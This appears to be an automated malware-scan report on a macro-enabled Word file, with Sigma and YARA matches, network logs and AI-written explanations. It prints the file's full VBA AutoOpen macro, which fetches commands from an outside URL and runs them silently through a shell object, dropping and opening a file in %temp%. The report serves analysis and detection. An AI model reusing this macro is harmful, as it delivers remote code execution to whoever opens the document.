trid.file_type: Word Microsoft Office Open XML Format document (with Macro)
Word Microsoft Office Open XML Format document

sigma_analysis_results.rule_title: Office Application Initiated Network Connection To Non-Local IP
sigma_analysis_results.rule_description:
Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.
This rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.
This rule will require an initial baseline and tuning that is specific to your organization.
sigma_analysis_results.rule_author: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io', Florian Roth (Nextron Systems), Tim Shelton, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{SourceIsIpv6=true; DestinationPort=53; Initiated=true; Protocol=udp; SourceIp=c0a8:21a:8b5c:2450:c8a0:f684:85a2:ffff; DestinationIsIpv6=true; EventID=3; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; SourcePort=49661; DestinationIp=808:808:0:ff:0:ff:0:ff}

@{SourceIsIpv6=true; DestinationPort=53; DestinationIp=808:808:0:ff:0:ff:0:ff; Protocol=udp; SourceIp=c0a8:21a:8b5c:2450:c8a0:f684:85a2:ffff; DestinationIsIpv6=true; EventID=3; SourcePort=51279; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; Initiated=true}

sigma_analysis_results.rule_description: Detects the creation of a new office macro files on the systems

macros.vba_code:
Sub AutoOpen()
Set p = CreateObject("MSXML2.ServerXMLHTTP.6.0")
p.Open "GET", "https://christinadudley.com/public_html/image/ksi/string.gif", False
p.Send
Dim aa(2)
a = p.responseText
ix = 1
For i = 0 To 1
    ix = InStr(ix, a, "@")
    aa(i) = Left(a, ix - 1)
    a = Right(a, Len(a) - ix)
Next
aa(2) = a
Set wShell = CreateObject(aa(0))
retu = wShell.Run(aa(1), 0, False)
file_doc = wShell.ExpandEnvironmentStrings("%temp%") & "\north korea.doc"
retu = wShell.Run(aa(2) + file_doc + """", 0, True)
retu = wShell.Run("""" + file_doc + """", 0, True)


End Sub

threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_ai_results.analysis:
The provided macros exhibit several behaviors indicative of malicious intent. 

1. AutoOpen Subroutine: The presence of the `AutoOpen()` subroutine is a common tactic used by malware to execute code automatically when a document is opened, which can lead to unauthorized actions without user consent.

2. HTTP Request: The macro uses `MSXML2.ServerXMLHTTP.6.0` to make an HTTP GET request to a specified URL (`https://christinadudley.com/public_html/image/ksi/string.gif`). This indicates an attempt to retrieve data from an external source, which could potentially be malicious content or instructions.

3. Response Handling: The response from the HTTP request is processed in a way that suggests it may contain executable commands or paths. The use of string manipulation functions (like `InStr`, `Left`, and `Right`) to parse the response implies that the macro is attempting to extract specific information, likely related to executing further commands.

4. Dynamic Execution: The macro creates an instance of `wShell` using `CreateObject(aa(0))`, where `aa(0)` is derived from the parsed response. This dynamic creation of objects based on external input is a red flag, as it allows for arbitrary command execution depending on what the attacker has placed at the specified URL.

5. File Execution: The macro constructs a file path in the temporary directory (`%temp%`) and attempts to run a file named `north korea.doc`. The fact that it runs this file with `wShell.Run` suggests that it may be executing a script or program disguised as a document, which is a common method for delivering payloads.

6. Silent Execution: The parameters passed to `wShell.Run` include `0` for the window style, indicating that the execution is intended to be silent (i.e., not visible to the user). This is often used in malware to avoid detection.

7. Multiple Executions: The macro attempts to run the constructed file multiple times, which could indicate persistence or an attempt to ensure that the payload executes successfully.

Overall, the combination of automatic execution, external data retrieval, dynamic command execution, and silent operation strongly suggests that these macros are designed with malicious intent, likely aimed at compromising the user's system or stealing information.

The macro AutoOpen() attempts to download content from "https://christinadudley.com/public_html/image/ksi/string.gif" using MSXML2.ServerXMLHTTP.6.0. It then parses the downloaded content, splitting it into three parts based on the "@" character as a delimiter. The first part is used to create an object (presumably a shell object). The second part is used to execute a command using the created shell object, hiding the window. A temporary file path "north korea.doc" is created. The third part is also used to run commands using the shell object with the temporary file path "north korea.doc" appended. Finally, it runs the document itself. The use of a remote URL, string parsing to determine shell commands, and execution of commands indicates suspicious behavior. The code downloads data from a remote server, which is then used to execute commands.
